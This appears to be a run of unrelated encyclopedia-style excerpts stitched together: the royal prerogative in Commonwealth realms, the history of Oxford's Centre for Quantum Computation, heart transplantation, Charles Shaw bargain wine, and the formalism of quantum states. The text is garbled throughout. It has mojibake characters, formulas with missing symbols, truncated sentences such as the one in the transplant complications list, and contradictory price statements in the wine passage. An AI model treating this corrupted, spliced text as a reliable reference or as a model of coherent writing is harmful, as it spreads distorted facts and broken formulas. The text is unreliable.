It is the means by which some of the executive powers of government, possessed by and vested in a monarch with regard to the process of governance of the state, are carried out.  Evolution  In most constitutional monarchies, prerogatives can be abolished by Parliament as the courts apply the constitutional near-absolute of the supremacy of Parliament. In the Commonwealth realms this draws on the constitutional statutes at the time of the Glorious Revolution when William III and Mary II were invited to take the throne. In the United Kingdom the remaining powers of the royal prerogative are devolved to the head of the government which for more than two centuries has been the Prime Minister; the benefits, equally, such as mineral rights in all gold and silver ores, vest in (belong to) the government.Case of Mines [1568] (Regina v Earl of Northumberland) In Britain, prerogative powers were originally exercised by the monarch acting, without an observed requirement for parliamentary consent (after its empowerment in certain matters following Magna Carta). Since the accession of the House of Hanover these powers have been, with minor exceptions in economically unimportant sectors, exercised on the advice of the Prime Minister or the Cabinet, who are accountable to Parliament, exclusively so, except in matters of the Royal Family, since at least the time of William IV. Typically in liberal democracies that are constitutional monarchies as well as nation states, such as those of Denmark, Norway, or Sweden, the royal prerogative serves in practice as a prescribed ceremonial function of the state power. =Ministerial exercise of the monarch's prerogatives= Today, prerogative powers fall into two main categories: *Those directly exercised by ministers without the approval of parliament, including, in some countries such as the UK, the powers to regulate the civil service, issue passports and grant honours. *Those exercised nominally by the monarch, \\"on the advice of\\" (that is, by constitutional convention, however so requested by) the prime minister and on the advice of the cabinet. Some key areas of government are carried out by the royal prerogative but its usage is falling as functions are progressively made statutory. Commonwealth realms =United Kingdom= In the Kingdom of England (up to 1707), the Kingdom of Great Britain (1707‚Äì1800), and the United Kingdom (since 1801), the royal prerogative was one of the central features of the realm's governance. Constitutional theorist A. V. Dicey gives the standard definition of what prerogative powers as follows: The scope of the royal prerogative is difficult to determine due to the uncodified nature of the constitution. It is clear that the existence and extent of the power is a matter of the common law of England, making the courts the final arbiter of whether a particular type of prerogative exists or not. Nevertheless, certain prerogative powers have been widely acknowledged and accepted over time, while others have fallen out of use. The royal prerogative is not constitutionally unlimited. In the Case of Proclamations (1611) during the reign of King James VI/I, English common law courts judges emphatically asserted that they possessed the right to determine the limits of the royal prerogative. Since the Glorious Revolution in 1688, which brought co-monarchs King William III and Queen Mary II to power, this interpretation of there being a separate and distinct power of the Judiciary has not been challenged by the Crown. It has been accepted that it is emphatically the province of the court(s) to say what the law is, or means. This is a crucial corollary and foundation to the concept of the judicial power; and its distinct and separate nature from the executive power possessed by the Crown itself, or its ministers. British dependencies Generally, the Crown retains all the power of the state in a Crown colony (even if in practice it is not directly exercised), which was later renamed ‚Äòdependent territory‚Äô in 1983 and has been known as ‚Äòoverseas territory‚Äô since 2002. Thus the royal prerogative is in theory an unlimited, arbitrary authority.Campbell v. Hall, 1774 In British overseas territories however, each inhabited territory has a constitution by which the territory is governed locally. The absoluteness of the royal prerogative in the colonies was however defeated in the case of Campbell v. Hall in 1774. This case decided that once a colony gained a representative assembly (or once the governor has been instructed to call one), the royal authority is limited to the familiar prerogatives; without the assembly's consent the Crown could not raise taxation nor change the law. Several of the colonies of the British West Indies thus became \\"settled colonies\\", and reverted to \\"crown colony\\" status only by Act of Parliament in the nineteenth century.e.g. The St. Vincent and Grenada Constitution Act 1876 (39 & 40 Vict. c. 47) In August 2009 the government of the Turks and Caicos Islands, a UK dependency, was revested in the governor, on the advice of the Government of the United Kingdom, under an Order in CouncilThe Turks and Caicos Islands Constitution (Interim Amendment) Order 2009 of 18 March 2009, which suspended and amended parts of the Islands' constitution, and vacated all the offices of ministers and the House of Assembly. This was not itself an exercise of the royal prerogative, as it was made under \\"the West Indies Act 1962 and of all other powers enabling Her to do so\\". However, in effect the order extended the royal prerogative in the Islands, vesting wide discretionary legislative and executive powers in Her Majesty's governor. The governor remains subject to the amended constitution, and in practice to the instructions of the Queen's Foreign Office in the UK. In the case of the Chagos Archipelago, in 2000, the High Court of Justice of England and Wales ruled that a local ordinance made by the Commissioner of the British Indian Ocean Territory exiling the islanders was unlawful, a decision which was accepted by the British Foreign Secretary Robin Cook. That Order was legislation passed under authority given by the royal prerogative, not an exercise of the prerogative itself, and was overturned as being beyond the powers given. After this decision, the British government issued an Order in Council, a primary exercise of the royal prerogative, to achieve the same objective. This Order was also ruled unlawful by the High Court, a ruling upheld in the Court of Appeal. However, on Wednesday, 22 October 2008, the government won its appeal in the House of Lords against the previous rulings. The House decided by a three-to-two majority that the Order in Council was a lawful exercise of authority.Britain wins appeal over Chagos islanders' return homeChagos islanders cannot return home In their speeches, the Law Lords admitted the government of the day was morally wrong to force out some 2,000 residents of the Chagos Archipelago, a British Crown colony, to make way for a US air base in the 1960s. Nevertheless, the majority could not find legal fault in the Order. =Canada= In Canada, the royal prerogative is, for the most part, the same as that in the United Kingdom, as constrained by constitutional convention, although its exercise is usually through the federal governor general in the Privy Council of Canada, or the provincial lieutenant governors in the provincial executive councils. The royal prerogative in Canada is largely set out in Part III of the Constitution Act, 1867, particularly section 9.Canada Department of Justice, Constitution Acts, 1867 to 1982 As foreign affairs are a matter of royal prerogative, the power to declare war and deploy the armed forces belongs to the Crown, though only in its federal Cabinet (the federal government), as outlined in sections 9 and 15 of the Constitution Act, 1867. Neither legislation nor any other type of parliamentary approval, beyond budgetary matters, is required for such actions, though the Cabinet has on occasion consulted parliament before engaging Canada or extending Canada's involvement in a conflict. Additionally, the federal and provincial crowns may ratify treaties, though only so far as they fall within the proper area of jurisdiction, according to sections 91 and 92 of the Constitution Act, 1867. Again, the endorsement of parliament is not necessary for these agreements to have force in an international sense, but the legislatures must pass treaties in order for them to have domestic effect. Proposed treaties have also occasionally been presented to parliament for debate before ratification. Members of Parliament have tabled bills seeking to curtail the use of the royal prerogative in foreign affairs by legislating a greater role for parliament, as have Senate standing committees, from time to time, called for the same. The issuance of passports also remains within the royal prerogative in Canada. The terms for the issuing of passports by the Minister of Foreign Affairs on behalf of the Crown are set out in the Canadian Passport Order,Canadian Passport Order, SI/81-86. issued by the Governor General-in- Council. The Canadian government has used the royal prerogative on two occasions to deny a passport to a Canadian citizen, Abdurahman Khadr and Fateh Kamel. Lawsuits filed at the Federal Court, Federal Court of Appeal, and ultimately the Supreme Court of Canada did not find in favour of either Khadr, nor Kamel. The royal prerogative in Canada extends also to the granting of honours, as explained by the Court of Appeal for Ontario in Black v. Chr√©tien (regarding Conrad Black's entitlement to an appointment to the House of Lords while a Canadian citizen). Other royal prerogatives, such as the prerogative of mercy, also exist in the Canadian context. =Other Commonwealth realms= In the other Commonwealth realms, the royal prerogative can be or is specifically mandated to be exercised by the monarch's representative, the governor-general. In the case of Australia, the royal prerogative is vested specifically in the Governor-General of Australia for military affairs, rather than the monarch, and is defined by the Constitution of Australia. The constitution of a Commonwealth realm may also sharply limit the prerogative. In some cases, governmental acts which would normally require royal prerogative may be enacted through other means in the constitution, or through a legislative act in a Commonwealth realm. Spain The Spanish Constitution of 1978, Title II The Crown, Article 62, delineates the powers of the king, while Title IV Government and Administration, Article 99, defines the king's role in government.T√≠tulo II.

Until recently, the CQC also included research groups at the University of Cambridge, but now the Cambridge groups operate as an independent entity called the Cambridge Centre for Quantum Information and Foundations (CQIF). Research The CQC conducts theoretical and experimental research into quantum computing, quantum cryptography and other forms of quantum information processing, into the implications of the quantum theory of information for physics itself, and into foundational and conceptual questions in quantum theory and quantum information theory.

Origins The Centre has its origins in the early 1980s when the computer industry began to worry about the limits of computing. In 1981, Oxford physicist David Deutsch attended a party in Texas given by the famous American physicist John Wheeler who had invited a number of scientists interested in the foundations of computing. It was at this party that Deutsch gained the crucial insight that would lead to an entirely new branch of physics. At the time, computer scientists were turning to Newtonian physics to try to resolve certain fundamental puzzles in the field. But during a conversation at Wheeler‚Äôs party, Deutsch realised that this was the wrong approach. Physics is fundamentally governed by quantum theory, and Deutsch could see immediately that using quantum theory instead of Newtonian physics would give a different result. As a consequence of this insight, Deutsch published the paper in 1985 that is now generally regarded as a classic in the field. Deutsch, David (July 1985). \\"Quantum theory, the Church-Turing principle and the universal quantum computer\\". Proceedings of the Royal Society of London; Series A, Mathematical and Physical Sciences 400 (1818): pp. 97‚Äì117. The paper describes how a computer might run using quantum mechanics and why such a computer is fundamentally different from ordinary computers. In 1987, Artur Ekert arrived at Oxford to work on a DPhil in physics, where he met Deutsch. Whilst working at Oxford, Ekert developed a theory of cryptography based on quantum entanglement. A chance meeting on the ski slopes of the Alps with John Rarity, a scientist at DRA (then the UK‚Äôs main military research organisation), led to a collaboration in which Ekert‚Äôs scheme was tested experimentally in the early 1990s. After finishing his DPhil, Ekert gained a junior research fellowship from Merton and took on his first DPhil student. With Deutsch, this created a small team that within a year had acquired the title of the Quantum Computation and Cryptography Group. A breakthrough in 1994 by Peter Shor, a researcher at the labs of the American telecommunications giant AT&T;, boosted the entire field of quantum information. Shor showed that Deutch‚Äôs quantum computer could actually solve an important problem that an ordinary computer would find impossible. For the first time, it became clear that quantum computers were far from unimportant curiosities. After Shor‚Äôs announcement, quantum information became increasingly popular with Oxford. In 1995, Andrew Steane began an experimental effort to study how quantum computers might be built from ionised atoms trapped by laser beams. In 1996, Jonathan Jones started a group working on a quantum computer based on the same techniques used in magnetic resonance imaging in medicine. And two years later, Dirk Bouwmeester arrived from Geneva to begin an experimental group working out how the quantum world could also revolutionise communication. The group changed its name to the Centre for Quantum Computation.Oxford Today, feature on Quantum Computing, 27 Oct 2000 Cambridge CQC group photo, Cambridge, 2006 When Artur Ekert moved to Cambridge to become the first Leigh Trapnell Professor of Quantum Physics in 2002, the Cambridge Centre for Quantum Computation was created. It continued under this name until 2010, when the existing research group was joined by Richard Jozsa, and the centre was renamed the Cambridge Centre for Quantum Information and Foundations (CQIF), reflecting the broad range of its research activities. The Cambridge CQIF is based at the Department of Applied Mathematics and Theoretical Physics (DAMTP), within the Centre for Mathematical Sciences. The Cambridge CQC's permanent faculty were Artur Ekert, Leigh Trapnell Professor of Quantum Physics at Cambridge from 2002 to 2007, and Adrian Kent, currently Reader in Quantum Physics at Cambridge.

The patient's own heart is either removed and replaced with the donor heart (orthotopic procedure) or, much less commonly, the recipient's diseased heart is left in place to support the donor heart (heterotopic, or \\"piggyback\\", transplant procedure). Approximately 3,500 heart transplants are performed each year worldwide, more than half of which are in the US. Post-operative survival periods average 15 years. Heart transplantation is not considered to be a cure for heart disease; rather it is a life-saving treatment intended to improve the quality and duration of life for a recipient.  History  American medical researcher Simon Flexner was one of the first people to mention the possibility of heart transplantation. In 1907, he wrote the paper \\"Tendencies in Pathology,\\" in which he said that it would be possible one day by surgery to replace diseased human organs ‚Äî including arteries, stomach, kidneys and heart.MAY TRANSPLANT THE HUMAN HEART (.PDF), The New York Times, January 2, 1908. Not having a human donor heart available, James D. Hardy of the University of Mississippi Medical Center transplanted the heart of a chimpanzee into the chest of a dying Boyd Rush in the early morning of Jan. 24, 1964. Hardy used a defibrillator to shock the heart to restart beating. This heart did beat in Rush's chest for 60 to 90 minutes (sources differ), and then Rush died without regaining consciousness.Every Second Counts: The Race to Transplant the First Human Heart, Donald McRae, New York: Penguin (Berkley/Putnam), 2006, Ch. 7 \\"Mississippi Gambling\\", pages 123-127.

Although Hardy was a respected surgeon who had performed the world's first human-to-human lung transplant a year earlier, See also in same issue.Second Wind: Oral Histories of Lung Transplant Survivors, Mary Jo Festle, Palgrave MacMillan, 2012. author Donald McRae states that Hardy could feel the \\"icy disdain\\" from fellow surgeons at the Sixth International Transplantation Conference several weeks after this attempt with the chimpanzee heart.Every Second Counts, McRae, page 126, top. Hardy had been inspired by the limited success of Keith Reemtsma at Tulane University in transplanting chimpanzee kidneys into human patients with kidney failure. ' . . the consent form for Hardy's operation‚Äîwhich, in view of the patient's semicomatose condition, was signed by a close relative‚Äîstipulated that no heart transplant had ever been performed, but made no mention of the fact that an animal heart might be used for the procedure. Such was the medicolegal situation at that time that this \\"informed\\" consent was not considered in any way inadequate. . ' The consent form Hardy asked Rush's stepsister to sign did not include the possibility that a chimpanzee heart might be used, although Hardy stated that he did include this in verbal discussions.Xenotransplantation: Law and Ethics, Sheila McLean, Laura Williamson, University of Glasgow, UK, Ashgate Publishing, 2005, page 50. A xenotransplantation is the technical term for the transplant of an organ or tissue from one species to another.

Keith Reemtsma and Fred Bowman also were members of the team for the six-hour operation.\\"TALK ABOUT A GUY WITH A LOT OF HEART 1st kid to get new ticker wants to be doc\\" NY Daily News, 13 April 2003 In 1988, the first \\"domino\\" heart transplant was performed, in which a patient in need of a lung transplant with a healthy heart will receive a heart-lung transplant, and their original heart will be transplanted into someone else. Worldwide, about 3,500 heart transplants are performed annually. The vast majority of these are performed in the United States (2,000‚Äì2,300 annually). Cedars-Sinai Medical Center in Los Angeles, California, currently is the largest heart transplant center in the world, having performed 132 adult transplants in 2015 alone. About 800,000 people have NYHA Class IV heart failure symptoms indicating advanced heart failure. The great disparity between the number of patients needing transplants and the number of procedures being performed spurred research into the transplantation of non- human hearts into humans after 1993. Xenografts from other species and artificial hearts are two less successful alternatives to allografts. The ability of medical teams to perform transplants continues to expand. For example, Sri Lanka's first heart transplant was successfully performed at the Kandy General Hospital on July 7, 2017.First ever heart transplant in Sri Lanka successful, Hiru News, Sunday, 09 July 2017. During heart transplant, the vagus nerve is severed, thus removing parasympathetic influence over the myocardium. However, some limited return of sympathetic nerves has been demonstrated in humans. Contraindications Some patients are less suitable for a heart transplant, especially if they suffer from other circulatory conditions related to their heart condition. The following conditions in a patient increase the chances of complications. Absolute contraindications: *Advanced kidney, lung, or liver disease *Active cancer if it is likely to impact the survival of the patient *Life-threatening diseases unrelated to heart failure, including acute infection or systemic disease such as systemic lupus erythematosus, sarcoidosis or amyloidosis *Vascular disease of the neck and leg arteries. *High pulmonary vascular resistance ‚Äì over 5 or 6 Wood units. Relative contraindications: *Insulin-dependent diabetes with severe organ dysfunction *Recent thromboembolism such as stroke *Severe obesity *Age over 65 years (some variation between centers) ‚Äì older patients are usually evaluated on an individual basis. *Active substance abuse, such as alcohol, recreational drugs or tobacco smoking (which increases the chance of lung disease) Mehra MR, Canter CE, Hannan MM, Semigran MJ, Uber PA, et al. The 2016 International Society for Heart Lung Transplantation listing criteria for heart transplantation: A 10-year update. J Heart Lung Transplant. 2016 Jan. 35 (1):1-23. Patients who are in need of a heart transplant but do not qualify may be candidates for an artificial heart or a left ventricular assist device (LVAD). Complications Potential complications include: Last Update: December 23, 2019. *Post-operative complications include infection, sepsis. The surgery death rate was 5‚Äì10% in 2011. *Acute or chronic graft rejection :*Cardiac allograft vasculopathy *Atrial arrhythmia *Lymphoproliferative malignancy *Increased risk of secondary infections due to immunosuppressive medication *Serum sickness due to anti-thymocyte globulin *Tricuspid valve regurgitation Repeated endomyocardial biopsy can cause =Rejection= Since the transplanted heart originates from another organism, the recipient's immune system typically attempts to reject it. The risk of rejection never fully goes away, and the patient will be on immunosuppressive drugs for the rest of their life. These drugs may cause unwanted side effects, such as increased likelihood of infections or development of certain cancers. Recipients can acquire kidney disease from a heart transplant due to the side effects of immunosuppressant medications. Many recent advances in reducing complications due to tissue rejection stem from mouse heart transplant procedures. People who have had heart transplants are monitored in various ways to test for the development of rejection.

Charles Shaw display in California after the 2013 price increase to US$2.49 Charles Shaw is a brand of bargain-priced wine. Largely made from California grapes, Charles Shaw wines include Cabernet Sauvignon, White Zinfandel, Merlot, Chardonnay, Sauvignon Blanc, Shiraz, Valdigui√© in the style of Beaujolais nouveau, and limited quantities of Pinot Grigio. These wines were introduced at Trader Joe's grocery stores in California in 2002 at a price of US$1.99 per bottle, earning the wines the nickname \\"Two Buck Chuck\\", and eventually sold 800 million bottles between 2002 and 2013. In 2009, an international version of Chardonnay from Australia was introduced in limited stores. Prices in states other than California have increased to US$3.79 per bottle. The price was later raised. , a bottle of Charles Shaw retailed for US$1.99 in California. The cost of the wine is about 30 to 40 percent of the price, with the glass, cork and distribution the larger part. The cost of shipping Two- Buck Chuck anywhere out of California becomes too high to justify the US$1.99 price.

Knowledge of the quantum state together with the rules for the system's evolution in time exhausts all that can be predicted about the system's behavior. A mixture of quantum states is again a quantum state. Quantum states that cannot be written as a mixture of other states are called pure quantum states, while all other states are called mixed quantum states. A pure quantum state can be represented by a ray in a Hilbert space over the complex numbers, while mixed states are represented by density matrices, which are positive semidefinite operators that act on Hilbert spaces. Pure states are also known as state vectors or wave functions, the latter term applying particularly when they are represented as functions of position or momentum. For example, when dealing with the energy spectrum of the electron in a hydrogen atom, the relevant state vectors are identified by the principal quantum number , the angular momentum quantum number , the magnetic quantum number , and the spin z-component . For another example, if the spin of an electron is measured in any direction, e.g. with a Stern‚ÄìGerlach experiment, there are two possible results: up or down. The Hilbert space for the electron's spin is therefore two-dimensional, constituting a qubit. A pure state here is represented by a two-dimensional complex vector (\\\\alpha, \\\\beta), with a length of one; that is, with :\\\\alpha^2 + \\\\beta^2 = 1, where \\\\alpha and \\\\beta are the absolute values of \\\\alpha and \\\\beta. A mixed state, in this case, has the structure of a 2 \\\\times 2 matrix that is Hermitian and positive semi-definite, and has trace 1. A more complicated case is given (in bra‚Äìket notation) by the singlet state, which exemplifies quantum entanglement: : \\\\left\\\\psi\\\\right\\\\rang = \\\\frac{1}{\\\\sqrt{2}}\\\\big(\\\\left\\\\uparrow\\\\downarrow\\\\right\\\\rang - \\\\left\\\\downarrow\\\\uparrow\\\\right\\\\rang \\\\big), which involves superposition of joint spin states for two particles with spin . The singlet state satisfies the property that if the particles' spins are measured along the same direction then either the spin of the first particle is observed up and the spin of the second particle is observed down, or the first one is observed down and the second one is observed up, both possibilities occurring with equal probability. A mixed quantum state corresponds to a probabilistic mixture of pure states; however, different distributions of pure states can generate equivalent (i.e., physically indistinguishable) mixed states. The Schr√∂dinger‚ÄìHJW theorem classifies the multitude of ways to write a given mixed state as a convex combination of pure states. Before a particular measurement is performed on a quantum system, the theory gives only a probability distribution for the outcome, and the form that this distribution takes is completely determined by the quantum state and the linear operators describing the measurement. Probability distributions for different measurements exhibit tradeoffs exemplified by the uncertainty principle: a state that implies a narrow spread of possible outcomes for one experiment necessarily implies a wide spread of possible outcomes for another. Conceptual description =Pure states= Probability densities for the electron of a hydrogen atom in different quantum states. In the mathematical formulation of quantum mechanics, pure quantum states correspond to vectors in a Hilbert space, while each observable quantity (such as the energy or momentum of a particle) is associated with a mathematical operator. The operator serves as a linear function which acts on the states of the system. The eigenvalues of the operator correspond to the possible values of the observable. For example, it is possible to observe a particle with a momentum of 1 kg‚ãÖm/s if and only if one of the eigenvalues of the momentum operator is 1 kg‚ãÖm/s. The corresponding eigenvector (which physicists call an eigenstate) with eigenvalue 1 kg‚ãÖm/s would be a quantum state with a definite, well- defined value of momentum of 1 kg‚ãÖm/s, with no quantum uncertainty. If its momentum were measured, the result is guaranteed to be 1 kg‚ãÖm/s. On the other hand, a system in a superposition of multiple different eigenstates does in general have quantum uncertainty for the given observable. We can represent this linear combination of eigenstates as: :\\\\Psi(t)\\\\rangle = \\\\sum_n C_n(t) \\\\Phi_n\\\\rang. The coefficient which corresponds to a particular state in the linear combination is a complex number, thus allowing interference effects between states. The coefficients are time dependent. How a quantum state changes in time is governed by the time evolution operator. The symbols  and \\\\rangle surrounding the \\\\Psi are part of bra‚Äìket notation. Statistical mixtures of states are a different type of linear combination. A statistical mixture of states is a statistical ensemble of independent systems. Statistical mixtures represent the degree of knowledge whilst the uncertainty within quantum mechanics is fundamental. Mathematically, a statistical mixture is not a combination using complex coefficients, but rather a combination using real-valued, positive probabilities of different states \\\\Phi_n. A number P_n represents the probability of a randomly selected system being in the state \\\\Phi_n. Unlike the linear combination case each system is in a definite eigenstate.Statistical Mixture of States The expectation value \\\\langle A \\\\rangle _\\\\sigma of an observable A is a statistical mean of measured values of the observable. It is this mean, and the distribution of probabilities, that is predicted by physical theories. There is no state which is simultaneously an eigenstate for all observables. For example, we cannot prepare a state such that both the position measurement Q(t) and the momentum measurement P(t) (at the same time t) are known exactly; at least one of them will have a range of possible values. This is the content of the Heisenberg uncertainty relation. Moreover, in contrast to classical mechanics, it is unavoidable that performing a measurement on the system generally changes its state.Heisenberg, W. (1927). √úber den anschaulichen Inhalt der quantentheoretischen Kinematik und Mechanik, Z. Phys. 43: 172‚Äì198. Translation as 'The actual content of quantum theoretical kinematics and mechanics'. Also translated as 'The physical content of quantum kinematics and mechanics' at pp. 62‚Äì84 by editors John Wheeler and Wojciech Zurek, in Quantum Theory and Measurement (1983), Princeton University Press, Princeton NJ.Bohr, N. (1927/1928). The quantum postulate and the recent development of atomic theory, Nature Supplement April 14 1928, 121: 580‚Äì590. More precisely: After measuring an observable A, the system will be in an eigenstate of A; thus the state has changed, unless the system was already in that eigenstate. This expresses a kind of logical consistency: If we measure A twice in the same run of the experiment, the measurements being directly consecutive in time, then they will produce the same results. This has some strange consequences, however, as follows. Consider two incompatible observables, A and B, where A corresponds to a measurement earlier in time than B. Suppose that the system is in an eigenstate of B at the experiment's beginning. If we measure only B, all runs of the experiment will yield the same result. If we measure first A and then B in the same run of the experiment, the system will transfer to an eigenstate of A after the first measurement, and we will generally notice that the results of B are statistical. Thus: Quantum mechanical measurements influence one another, and the order in which they are performed is important. Another feature of quantum states becomes relevant if we consider a physical system that consists of multiple subsystems; for example, an experiment with two particles rather than one. Quantum physics allows for certain states, called entangled states, that show certain statistical correlations between measurements on the two particles which cannot be explained by classical theory. For details, see entanglement. These entangled states lead to experimentally testable properties (Bell's theorem) that allow us to distinguish between quantum theory and alternative classical (non-quantum) models. =Schr√∂dinger picture vs. Heisenberg picture= One can take the observables to be dependent on time, while the state œÉ was fixed once at the beginning of the experiment. This approach is called the Heisenberg picture. (This approach was taken in the later part of the discussion above, with time- varying observables P(t), Q(t).) One can, equivalently, treat the observables as fixed, while the state of the system depends on time; that is known as the Schr√∂dinger picture. (This approach was taken in the earlier part of the discussion above, with a time-varying state \\\\Psi(t)\\\\rangle = \\\\sum_n C_n(t) \\\\Phi_n\\\\rang.) Conceptually (and mathematically), the two approaches are equivalent; choosing one of them is a matter of convention. Both viewpoints are used in quantum theory. While non-relativistic quantum mechanics is usually formulated in terms of the Schr√∂dinger picture, the Heisenberg picture is often preferred in a relativistic context, that is, for quantum field theory. Compare with Dirac picture. Formalism in quantum physics =Pure states as rays in a Hilbert space= Quantum physics is most commonly formulated in terms of linear algebra, as follows. Any given system is identified with some finite- or infinite-dimensional Hilbert space. The pure states correspond to vectors of norm 1. Thus the set of all pure states corresponds to the unit sphere in the Hilbert space, because the unit sphere is defined as the set of all vectors with norm 1. Multiplying a pure state by a scalar is physically inconsequential (as long as the state is considered by itself). If one vector is obtained from the other by multiplying by a scalar of unit magnitude, the two vectors are said to correspond to the same \\"ray\\" in Hilbert space and also to the same point in the projective Hilbert space. =Bra‚Äìket notation= Calculations in quantum mechanics make frequent use of linear operators, scalar products, dual spaces and Hermitian conjugation. In order to make such calculations flow smoothly, and to make it unnecessary (in some contexts) to fully understand the underlying linear algebra, Paul Dirac invented a notation to describe quantum states, known as bra‚Äìket notation. Although the details of this are beyond the scope of this article, some consequences of this are: *The expression used to denote a state vector (which corresponds to a pure quantum state) takes the form \\\\psi\\\\rangle (where the \\"\\\\psi\\" can be replaced by any other symbols, letters, numbers, or even words). This can be contrasted with the usual mathematical notation, where vectors are usually lower-case latin letters, and it is clear from the context that they are indeed vectors. *Dirac defined two kinds of vector, bra and ket, dual to each other. *Each ket \\\\psi\\\\rangle is uniquely associated with a so-called bra, denoted \\\\langle\\\\psi, which corresponds to the same physical quantum state. Technically, the bra is the adjoint of the ket. It is an element of the dual space, and related to the ket by the Riesz representation theorem. In a finite-dimensional space with a chosen basis, writing \\\\psi\\\\rangle as a column vector, \\\\langle\\\\psi is a row vector; to obtain it just take the transpose and entry-wise complex conjugate of \\\\psi\\\\rangle. *Scalar products (also called brackets) are written so as to look like a bra and ket next to each other: \\\\lang \\\\psi_1\\\\psi_2\\\\rang. (The phrase \\"bra-ket\\" is supposed to resemble \\"bracket\\".) =Spin= The angular momentum has the same dimension (M¬∑L¬∑T) as the Planck constant and, at quantum scale, behaves as a discrete degree of freedom of a quantum system. Most particles possess a kind of intrinsic angular momentum that does not appear at all in classical mechanics and arises from Dirac's relativistic generalization of the theory. Mathematically it is described with spinors. In non-relativistic quantum mechanics the group representations of the Lie group SU(2) are used to describe this additional freedom. For a given particle, the choice of representation (and hence the range of possible values of the spin observable) is specified by a non- negative number S that, in units of Planck's reduced constant ƒß, is either an integer (0, 1, 2 ...) or a half-integer (1/2, 3/2, 5/2 ...). For a massive particle with spin S, its spin quantum number m always assumes one of the 2S + 1 possible values in the set :\\\\\\\\{ -S, -S+1, \\\\ldots +S-1, +S \\\\\\\\} As a consequence, the quantum state of a particle with spin is described by a vector-valued wave function with values in C2S+1. Equivalently, it is represented by a complex-valued function of four variables: one discrete quantum number variable (for the spin) is added to the usual three continuous variables (for the position in space). =Many-body states and particle statistics= The quantum state of a system of N particles, each potentially with spin, is described by a complex-valued function with four variables per particle, corresponding to 3 spatial coordinates and spin, e.g. :\\\\psi (\\\\mathbf r_1,\\\\, m_1;\\\\; \\\\dots;\\\\; \\\\mathbf r_N,\\\\, m_N)\\\\rangle. Here, the spin variables mŒΩ assume values from the set :\\\\\\\\{-S_ u,\\\\, -S_ u + 1,\\\\, \\\\ldots,\\\\, +S_ u - 1,\\\\, +S_ u \\\\\\\\} where S_ u is the spin of ŒΩth particle. S_ u = 0 for a particle that does not exhibit spin. The treatment of identical particles is very different for bosons (particles with integer spin) versus fermions (particles with half-integer spin). The above N-particle function must either be symmetrized (in the bosonic case) or anti-symmetrized (in the fermionic case) with respect to the particle numbers. If not all N particles are identical, but some of them are, then the function must be (anti)symmetrized separately over the variables corresponding to each group of identical variables, according to its statistics (bosonic or fermionic). Electrons are fermions with S = 1/2, photons (quanta of light) are bosons with S = 1 (although in the vacuum they are massless and can't be described with Schr√∂dinger mechanics). When symmetrization or anti-symmetrization is unnecessary, N-particle spaces of states can be obtained simply by tensor products of one-particle spaces, to which we will return later. =Basis states of one-particle systems= As with any Hilbert space, if a basis is chosen for the Hilbert space of a system, then any ket can be expanded as a linear combination of those basis elements. Symbolically, given basis kets {k_i}\\\\rang, any ket \\\\psi\\\\rang can be written : \\\\psi \\\\rang = \\\\sum_i c_i {k_i}\\\\rangle where ci are complex numbers. In physical terms, this is described by saying that \\\\psi\\\\rang has been expressed as a quantum superposition of the states {k_i}\\\\rang. If the basis kets are chosen to be orthonormal (as is often the case), then c_i=\\\\lang {k_i}  \\\\psi \\\\rang. One property worth noting is that the normalized states \\\\psi\\\\rang are characterized by :\\\\lang\\\\psi\\\\psi\\\\rang = 1, and for orthonormal basis this translates to :\\\\sum_i \\\\left  c_i \\\\right  ^2 = 1. Expansions of this sort play an important role in measurement in quantum mechanics. In particular, if the {k_i}\\\\rang are eigenstates (with eigenvalues ki) of an observable, and that observable is measured on the normalized state \\\\psi\\\\rang, then the probability that the result of the measurement is ki is ci2. (The normalization condition above mandates that the total sum of probabilities is equal to one.) A particularly important example is the position basis, which is the basis consisting of eigenstates \\\\mathbf{r}\\\\rang with eigenvalues \\\\mathbf{r} of the observable which corresponds to measuring position. If these eigenstates are nondegenerate (for example, if the system is a single, spinless particle), then any ket \\\\psi\\\\rang is associated with a complex- valued function of three-dimensional space :\\\\psi(\\\\mathbf{r}) \\\\equiv \\\\lang \\\\mathbf{r}  \\\\psi \\\\rang. This function is called the wave function corresponding to \\\\psi\\\\rang. Similarly to the discrete case above, the probability density of the particle being found at position \\\\mathbf{r} is \\\\psi(\\\\mathbf{r})^2 and the normalized states have :\\\\int \\\\mathrm{d}^3 \\\\mathbf{r} \\\\, \\\\psi(\\\\mathbf{r})^2 = 1. In terms of the continuous set of position basis \\\\mathbf{r}\\\\rang, the state \\\\psi \\\\rang is: :\\\\psi \\\\rang = \\\\int \\\\mathrm{d}^3 \\\\mathbf{r} \\\\, \\\\psi (\\\\mathbf{r}) \\\\mathbf{r}\\\\rang . =Superposition of pure states= As mentioned above, quantum states may be superposed. If \\\\alpha\\\\rangle and \\\\beta\\\\rangle are two kets corresponding to quantum states, the ket :c_\\\\alpha\\\\alpha\\\\rang+c_\\\\beta\\\\beta\\\\rang is a different quantum state (possibly not normalized). Note that both the amplitudes and phases (arguments) of c_\\\\alpha and c_\\\\beta will influence the resulting quantum state. In other words, for example, even though \\\\psi\\\\rang and e^{i\\\\theta}\\\\psi\\\\rang (for real Œ∏) correspond to the same physical quantum state, they are not interchangeable, since \\\\phi\\\\rang+\\\\psi\\\\rang and \\\\phi\\\\rang+e^{i\\\\theta}\\\\psi\\\\rang will not correspond to the same physical state for all choices of \\\\phi\\\\rang. However, \\\\phi\\\\rang+\\\\psi\\\\rang and e^{i\\\\theta}(\\\\phi\\\\rang+\\\\psi\\\\rang) will correspond to the same physical state. This is sometimes described by saying that \\"global\\" phase factors are unphysical, but \\"relative\\" phase factors are physical and important. One practical example of superposition is the double-slit experiment, in which superposition leads to quantum interference. The photon state is a superposition of two different states, one corresponding to the photon travel through the left slit, and the other corresponding to travel through the right slit. The relative phase of those two states depends on the difference of the distances from the two slits. Depending on that phase, the interference is constructive at some locations and destructive in others, creating the interference pattern. We may say that superposed states are in coherent superposition, by analogy with coherence in other wave phenomena. Another example of the importance of relative phase in quantum superposition is Rabi oscillations, where the relative phase of two states varies in time due to the Schr√∂dinger equation. The resulting superposition ends up oscillating back and forth between two different states. =Mixed states= A pure quantum state is a state which can be described by a single ket vector, as described above. A mixed quantum state is a statistical ensemble of pure states (see quantum statistical mechanics). Mixed states inevitably arise from pure states when, for a composite quantum system H_1 \\\\otimes H_2 with an entangled state on it, the part H_2 is inaccessible to the observer. The state of the part H_1 is expressed then as the partial trace over H_2. A mixed state cannot be described with a single ket vector. Instead, it is described by its associated density matrix (or density operator), usually denoted œÅ. Note that density matrices can describe both mixed and pure states, treating them on the same footing. Moreover, a mixed quantum state on a given quantum system described by a Hilbert space H can be always represented as the 